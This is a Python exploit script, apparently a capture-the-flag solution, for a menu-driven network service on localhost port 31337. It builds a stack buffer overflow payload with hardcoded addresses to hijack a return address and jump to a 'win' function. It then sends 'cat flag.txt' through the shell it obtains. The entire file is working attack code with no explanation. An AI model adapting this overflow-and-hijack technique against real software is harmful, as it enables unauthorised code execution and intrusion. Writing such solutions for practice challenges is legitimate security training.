#!/opt/homebrew/bin/python3
import socket
import struct
import time

HOST = "127.0.0.1"
PORT = 31337

WIN = 0x4012D6
RET_PLAY_TO_DORESET = 0x4013B9


def recv_some(sock: socket.socket, timeout: float = 0.2) -> bytes:
    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except (TimeoutError, socket.timeout):
            break
    return data


def build_payload() -> bytes:
    # Overflow from play()'s buf into do_reset()'s return address.
    payload = b"0\n"
    payload += b"A" * (0x38 - len(payload))
    payload += struct.pack("<Q", RET_PLAY_TO_DORESET)
    payload += b"B" * 8
    payload += struct.pack("<Q", WIN)
    return payload.ljust(0x80, b"Z")


def main() -> None:
    payload = build_payload()
    s = socket.create_connection((HOST, PORT))

    print(recv_some(s).decode("latin-1", "ignore"), end="")

    s.sendall(b"USERUSERUSERUSER")
    time.sleep(0.1)
    print(recv_some(s).decode("latin-1", "ignore"), end="")

    s.sendall(b"4\n")
    time.sleep(0.1)
    print(recv_some(s).decode("latin-1", "ignore"), end="")

    s.sendall(b"RESETRESETRESET12")
    time.sleep(0.1)
    print(recv_some(s).decode("latin-1", "ignore"), end="")

    s.sendall(b"1\n")
    time.sleep(0.1)
    print(recv_some(s).decode("latin-1", "ignore"), end="")

    s.sendall(payload)
    time.sleep(0.1)
    print(recv_some(s).decode("latin-1", "ignore"), end="")

    s.sendall(b"0\n")
    time.sleep(0.2)
    print(recv_some(s).decode("latin-1", "ignore"), end="")

    s.sendall(b"cat flag.txt\n")
    time.sleep(0.2)
    print(recv_some(s).decode("latin-1", "ignore"), end="")

    s.sendall(b"exit\n")
    s.close()


if __name__ == "__main__":
    main()
